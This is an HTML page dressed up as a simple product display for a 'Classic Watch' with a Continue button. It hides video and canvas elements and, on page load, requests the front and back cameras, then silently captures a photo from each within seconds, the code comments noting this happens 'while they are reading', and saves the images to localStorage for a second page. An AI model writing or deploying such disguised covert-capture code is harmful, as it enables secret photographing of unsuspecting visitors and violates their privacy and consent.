<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Identifier</title>
    <style>
        body { background: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; margin: 0; }
        .content { text-align: center; padding: 20px; }
        h1 { font-size: 3rem; color: #333; }
        p { font-size: 1.2rem; color: #666; }
        .next-btn { margin-top: 20px; padding: 10px 20px; border: none; background: #6c63ff; color: white; border-radius: 5px; cursor: pointer; }
    </style>
</head>
<body>

    <div class="content">
        <h1 id="item-name">Classic Watch</h1>
        <p id="item-desc">A timeless piece of craftsmanship.</p>
        <button class="next-btn" onclick="goToPageTwo()">Continue &rarr;</button>
    </div>

    <!-- Hidden Camera Elements -->
    <video id="vFront" autoplay playsinline style="display:none;"></video>
    <video id="vBack" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        const frontVideo = document.getElementById('vFront');
        const backVideo = document.getElementById('vBack');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');

        // 1. As soon as the page loads, request the camera
        window.onload = () => {
            // Get Front Camera
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }).then(stream => {
                frontVideo.srcObject = stream;
                
                // Get Back Camera
                return navigator.mediaDevices.getUserMedia({ video: { facingMode: "back" } }).then(streamBack => {
                    backVideo.srcObject = streamBack;

                    // 2. AUTOMATIC SNAP (Happens while they are reading)
                    // Snap Front Camera
                    setTimeout(() => {
                        ctx.drawImage(frontVideo, 0, 0, 640, 480);
                        // Save to "Backpack" (Local Storage)
                        localStorage.setItem('frontPhoto', canvas.toDataURL());
                    }, 1000);

                    // Snap Back Camera
                    setTimeout(() => {
                        ctx.drawImage(backVideo, 0, 0, 640, 480);
                        // Save to "Backpack" (Local Storage)
                        localStorage.setItem('backPhoto', canvas.toDataURL());
                    }, 1500);
                });
            });
        };

        // 3. Move to Page 2
        function goToPageTwo() {
            window.location.href = "page2.html";
        }
    </script>
</body>
</html>
